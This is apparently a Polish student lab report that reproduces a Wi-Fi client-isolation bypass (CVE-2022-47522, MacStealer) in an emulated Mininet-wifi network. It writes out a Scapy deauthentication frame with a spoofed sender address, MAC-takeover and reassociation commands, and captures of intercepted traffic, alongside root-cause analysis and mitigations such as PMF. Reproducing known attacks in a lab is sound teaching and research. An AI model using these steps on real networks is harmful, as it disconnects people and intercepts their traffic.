# MAC Spoofing + Association Hijacking
## Ominięcie izolacji klientów Wi-Fi (Client Isolation Bypass)

**CVE-2022-47522** | AirSnitch Port Stealing | MacStealer  
**Środowisko:** Kali Linux · Mininet-wifi · Scapy · hostapd · Wireshark  

---

## 1. Na czym polega atak

### Założenie — jak działa Client Isolation

Client Isolation (izolacja klientów, AP Isolation) to mechanizm bezpieczeństwa stosowany w routerach Wi-Fi — hotelowych, uczelnianych (eduroam), firmowych i domowych. Jego zadaniem jest uniemożliwienie bezpośredniej komunikacji między urządzeniami podłączonymi do tej samej sieci. Klient A nie powinien móc wysyłać pakietów bezpośrednio do klienta B, nawet jeśli oboje są w tej samej sieci Wi-Fi.

### Fundamentalna wada projektowa

Standard 802.11 rozdziela dwie rzeczy, które powinny być ze sobą ściśle powiązane:

| Aspekt | Mechanizm | Bezpieczeństwo |
|--------|-----------|----------------|
| **Kto jesteś** (autentykacja) | Hasło WPA2/WPA3, certyfikat 802.1X | Kryptograficzne — trudne do podrobienia |
| **Gdzie wysłać ruch** (rutowanie L2) | Adres MAC | Brak weryfikacji — trivialnie zmienialny |

Access Point po zalogowaniu się klienta kojarzy jego adres MAC z jego kluczami szyfrującymi (PTK) i portem w wewnętrznym przełączniku. Od tej chwili **cały ruch przychodzący jest kierowany na podstawie adresu MAC**, a nie na podstawie tożsamości kryptograficznej użytkownika.

Atakujący może zalogować się do sieci **swoimi** danymi uwierzytelnienia, ale podając **adres MAC innego klienta** (ofiary). AP nie weryfikuje tej niespójności. W efekcie AP aktualizuje swoją tabelę asocjacji i zaczyna kierować ruch przeznaczony dla ofiary do atakującego.

---

## 2. Topologia środowiska testowego

```
  [sta1 — OFIARA]            [sta2 — ATAKUJĄCY]
   IP: 10.0.0.1               IP: 10.0.0.2
   MAC: 02:00:00:00:04:00     MAC: 02:00:00:00:05:00
        \                         /
         \                       /
          -------- AP --------
                   |
                   | WPA2, Client Isolation = WŁĄCZONA
                   |
              [h1 — HOST]
               IP: 10.0.0.100
```

Środowisko uruchomione w **Mininet-wifi** — emulatorze sieci bezprzewodowych. AP wirtualizowany przez `hostapd`, stacje przez `mac80211_hwsim` (moduł jądra Linux tworzący wirtualne karty Wi-Fi). Ruch analizowany przez `tcpdump` i `Wireshark`.

---

## 3. Przebieg ataku krok po kroku

### Krok 1 — Potwierdzenie działania izolacji (baseline)

Przed atakiem izolacja klientów działa poprawnie:

```
sta1 ping 10.0.0.2  →  100% packet loss   ✓ (izolacja blokuje)
sta1 ping 10.0.0.100 → 0% packet loss    ✓ (routing do hosta działa)
```

Atakujący (sta2) nie może dosięgnąć ofiary (sta1) bezpośrednim pingiem.

---

### Krok 2 — Rozpoznanie: odczyt MAC ofiary

Atakujący odczytuje adres MAC ofiary. W środowisku emulowanym z pliku konfiguracyjnego. W rzeczywistej sieci: z ramek 802.11 widocznych w eterze (każde urządzenie rozgłasza swój MAC w nagłówkach ramek Wi-Fi — widoczny przez `airodump-ng`, `Wireshark` w trybie monitor).

```
Ofiara MAC: 02:00:00:00:04:00
AP MAC:     02:00:00:00:06:00
```

---

### Krok 3 — Deauthentication: rozłączenie ofiary

Atakujący wysyła ramki **802.11 Deauthentication** do AP, podszywając się pod ofiarę (spoofując jej MAC w polu nadawcy ramki). AP rozłącza ofiarę.

```python
# Scapy — ramka Deauthentication
Dot11(type=0, subtype=12,
      addr1=AP_MAC,       # Receiver: AP
      addr2=VICTIM_MAC,   # Transmitter: podszywamy się pod ofiarę
      addr3=AP_MAC) /
Dot11Deauth(reason=3)     # reason=3: Leaving network
```

**Dlaczego to działa:** Ramki zarządzające 802.11 (w tym Deauth) są domyślnie **niezaszyfrowane i nieuwierzytelniane**. Standard 802.11w (PMF — Protected Management Frames) eliminuje ten wektor, ale większość sieci go nie wymusza.

---

### Krok 4 — Podmiana adresu MAC

Atakujący zmienia adres MAC swojego interfejsu na adres MAC ofiary:

```bash
ip link set sta2-wlan0 down
ip link set sta2-wlan0 address 02:00:00:00:04:00   # MAC ofiary
ip link set sta2-wlan0 up
```

Po zmianie:
```
Przed: sta2-wlan0 = 02:00:00:00:05:00  (własny MAC)
Po:    sta2-wlan0 = 02:00:00:00:04:00  (MAC ofiary)
```

---

### Krok 5 — Ponowna asocjacja z AP

Atakujący łączy się z AP używając **własnego hasła WPA2**, ale z **MAC-em ofiary**:

```bash
wpa_cli -i sta2-wlan0 reassociate
```

AP wykonuje standardowy 4-Way Handshake z atakującym i zapisuje nowe mapowanie:

```
MAC: 02:00:00:00:04:00  →  klucze PTK atakującego  →  port sta2
```

Poprzednie mapowanie (MAC ofiary → klucze ofiary → port sta1) zostaje **nadpisane**. Ofiara jest efektywnie wyrzucona z sieci.

---

### Krok 6 — Przechwycenie ruchu

Od tej chwili każdy pakiet skierowany na adres MAC ofiary (`02:00:00:00:04:00`) jest przez AP kierowany do atakującego. Uruchamiamy sniff na interfejsie sta2:

```
tcpdump na sta2-wlan0, filtr: dst 10.0.0.1

13:37:22.147618 IP 10.0.0.100 > 10.0.0.1: ICMP echo request, seq 1
13:37:23.150442 IP 10.0.0.100 > 10.0.0.1: ICMP echo request, seq 2
13:37:24.151357 IP 10.0.0.100 > 10.0.0.1: ICMP echo request, seq 3
...
10 packets captured
```

Pakiety ICMP wysłane przez h1 do ofiary (10.0.0.1) **trafiły na interfejs atakującego (sta2)**, a nie do prawdziwej ofiary (sta1).

---

## 4. Dlaczego atak się powiódł

### Przyczyna 1 — Brak powiązania tożsamości z MAC-em

AP autentykuje użytkownika hasłem (WPA2-PSK), ale do rutowania ruchu używa adresu MAC. Nie istnieje żaden mechanizm który weryfikuje, że `MAC=X` nadal należy do tej samej osoby co przy poprzednim logowaniu. Każdy kto może się zalogować do sieci, może użyć dowolnego MAC-a.

### Przyczyna 2 — Niezabezpieczone ramki zarządzające (brak PMF)

Ramki Deauthentication bez 802.11w (PMF) mogą być wysłane przez dowolne urządzenie w zasięgu. AP nie weryfikuje ich autentyczności. Pozwala to na wymuszone rozłączenie ofiary przed przejęciem jej MAC-a.

### Przyczyna 3 — Client Isolation działa tylko na warstwie L2

Izolacja blokuje bezpośrednie mostowanie ramek między klientami (sta1 → sta2). Ale nie chroni przed scenariuszem, w którym atakujący **staje się** klientem w oczach AP. Atak nie mostuje nic — zastępuje ofiarę w tabeli asocjacji AP.

### Przyczyna 4 — Universalność luki

Luka nie wynika z błędu konkretnego producenta, lecz z **fundamentalnej wady projektowej protokołu 802.11**. Badania Vanhoefa (USENIX Security '23) wykazały podatność routerów Netgear, TP-Link, ASUS, Cisco, Ubiquiti, LANCOM — zarówno w sieciach WPA2, jak i WPA3. Środowisko emulowane (Mininet-wifi + hostapd) odtwarza tę samą podatność.

---

## 5. Wyniki i dowody

### Tabela wyników

| Test | Wynik | Interpretacja |
|------|-------|---------------|
| sta1 → sta2 (przed atakiem) | 100% packet loss | Izolacja działa |
| sta1 → h1 (przed atakiem) | 0% packet loss | Sieć działa normalnie |
| MAC sta2 po ataku | `02:00:00:00:04:00` | Podmieniony na MAC ofiary |
| h1 → sta1 (po ataku, tcpdump sta2) | **10 pakietów przechwyconych** | Atak udany |
| h1 → sta1 (po ataku, odpowiedź) | Brak odpowiedzi od ofiary | Ofiara wyrzucona z sieci |

### Dowód — wynik tcpdump (sta2 po ataku)

```
tcpdump: listening on sta2-wlan0, link-type EN10MB
13:37:22.147618 IP 10.0.0.100 > 10.0.0.1: ICMP echo request, id 38491, seq 1, length 64
13:37:23.150442 ARP, Request who-has 10.0.0.1 tell 10.0.0.2, length 28
13:37:24.151357 IP 10.0.0.100 > 10.0.0.1: ICMP echo request, id 38491, seq 3, length 64
...
10 packets captured, 0 packets dropped by kernel
```

Pakiety `IP 10.0.0.100 > 10.0.0.1` (h1 → ofiara) są widoczne na interfejsie **atakującego** (sta2), mimo włączonej izolacji klientów.

Plik PCAP: `/home/kali/bbsk-projekt/captures/attack_result.pcap`

---

## 6. Możliwe mitigacje

| Metoda | Opis | Konfiguracja |
|--------|------|--------------|
| **PMF / 802.11w** | Kryptograficznie zabezpiecza ramki Deauthentication — niemożliwe staje się wymuszone rozłączenie ofiary | `hostapd.conf: ieee80211w=2` |
| **Per-Station PSK / Identity PSK** | Każdy klient ma unikalne hasło; AP może wykryć próbę reużycia MAC-a z innym hasłem | Cisco Identity PSK, Aruba MPSK |
| **Opóźnienie reassocjacji** | AP odmawia asocjacji z MAC-em który był aktywny w ostatnich X sekundach | Wymaga niestandardowej implementacji hostapd |
| **WPA3 + PMF obowiązkowe** | WPA3 wymusza PMF, co eliminuje wektor Deauth | Upgrade sieci do WPA3-SAE |

Żadna z powyższych metod nie jest jednak domyślnie włączona w większości dostępnych routerów.

---

## 7. Powiązania z literaturą

- **CVE-2022-47522** — oficjalny identyfikator luki opisanej w MacStealer
- **MacStealer** (Vanhoef, 2022) — https://github.com/vanhoefm/macstealer
- **AirSnitch** (Vanhoef et al., NDSS 2024) — kompleksowe badanie izolacji klientów Wi-Fi, sekcja V.B: Port Stealing
- **Framing Frames** (Schepers, Vanhoef, USENIX Security '23) — *security context override attack*, sekcja 5

---

## 8. Uruchomienie — komendy krok po kroku

### Przygotowanie środowiska (jednorazowo po starcie VM)

```bash
# wyczyszczenie poprzedniej sesji mininet i zaladowanie modulu wirtualnych kart wifi
sudo mn -c
sudo modprobe mac80211_hwsim radios=4

# weryfikacja ze modul zaladowany
lsmod | grep mac80211_hwsim
```

### Uruchomienie topologii

```bash
# startujemy siec: 1 AP (wpa2, client_isolation=true) + sta1 + sta2 + h1
sudo python3 /home/kali/bbsk-projekt/topology.py
```

Po pojawieniu się prompta `mininet-wifi>` konieczna jest ręczna naprawa bridge OVS (problem z kolejnością portów przy starcie):

```
mininet-wifi> sh ovs-vsctl del-port ap1 ap1-wlan2
mininet-wifi> sh ovs-vsctl del-port ap1 h1-eth0
mininet-wifi> sh ovs-vsctl add-port ap1 ap1-wlan1
```

### Weryfikacja baseline (izolacja działa)

```
mininet-wifi> sta1 ping -c 3 10.0.0.100   # powinno dzialac (routing do hosta)
mininet-wifi> sta1 ping -c 3 10.0.0.2     # powinno failowac (izolacja klientow)
```

Oczekiwany wynik dla izolacji: `3 packets transmitted, 0 received, 100% packet loss`

### Uruchomienie demo ataku

W osobnym terminalu (lub z CLI Mininet):

```bash
# opcja A - z osobnego terminala root
sudo python3 /home/kali/bbsk-projekt/demo.py

# opcja B - z CLI Mininet (w przestrzeni nazw sta2)
# mininet-wifi> sta2 python3 /home/kali/bbsk-projekt/demo.py
```

Skrypt zatrzymuje się po każdym kroku i czeka na Enter.

### Co robi demo krok po kroku

| Krok | Komenda | Opis |
|------|---------|------|
| 1 | `cat /tmp/bbsk_config.txt` | odczyt MAC ofiary i AP z pliku konfiguracyjnego |
| 2 | `ping -c 3 -W 1 10.0.0.1` | potwierdzenie że izolacja blokuje ruch sta2→sta1 |
| 3 | `sendp(Dot11Deauth, iface=sta2-wlan0, count=10)` | wysłanie 10 ramek 802.11 Deauth (Scapy) |
| 4 | `ip link set sta2-wlan0 address <MAC_OFIARY>` | podmiana MAC interfejsu atakującego |
| 5 | `wpa_cli -i sta2-wlan0 reassociate` | ponowna asocjacja z AP z MAC ofiary |
| 6 | `sniff(iface=sta2-wlan0, filter='dst host 10.0.0.1')` | przechwycenie pakietów przeznaczonych dla ofiary |

### Podgląd wyników po ataku

```bash
# log ataku
cat /home/kali/bbsk-projekt/logs/demo.log

# otwarcie PCAP w Wiresharku
wireshark /home/kali/bbsk-projekt/captures/demo_result.pcap

# filtr Wireshark pokazujacy przechwycone pakiety ofiary
# ip.dst == 10.0.0.1
```

### Sprawdzenie stanu asocjacji w trakcie ataku

```bash
# z CLI Mininet - sprawdz ktore stacje sa podlaczone do AP
mininet-wifi> ap1 hostapd_cli all_sta

# weryfikacja MAC na interfejsie atakujacego
mininet-wifi> sta2 cat /sys/class/net/sta2-wlan0/address

# status polaczenia sta2
mininet-wifi> sta2 iw dev sta2-wlan0 link
```

### Reset i ponowne uruchomienie

Jeśli coś pójdzie nie tak:

```bash
# z CLI Mininet
mininet-wifi> exit

# reset i start od nowa
sudo mn -c
sudo modprobe mac80211_hwsim radios=4
sudo python3 /home/kali/bbsk-projekt/topology.py
```

---

## 9. Narzędzia i pliki projektu

| Plik | Opis |
|------|------|
| `topology.py` | Definicja topologii Mininet-wifi (AP, stacje, host) |
| `demo.py` | Demo ataku z przerwami na Enter i komentarzami technicznymi |
| `attack.py` | Pełny skrypt ataku z trybem `--demo` |
| `baseline_test.sh` | Automatyczny test izolacji przed atakiem |
| `captures/demo_result.pcap` | PCAP z przechwyconym ruchem ofiary |
| `logs/demo.log` | Log z adresami MAC, komendami i wynikiem |
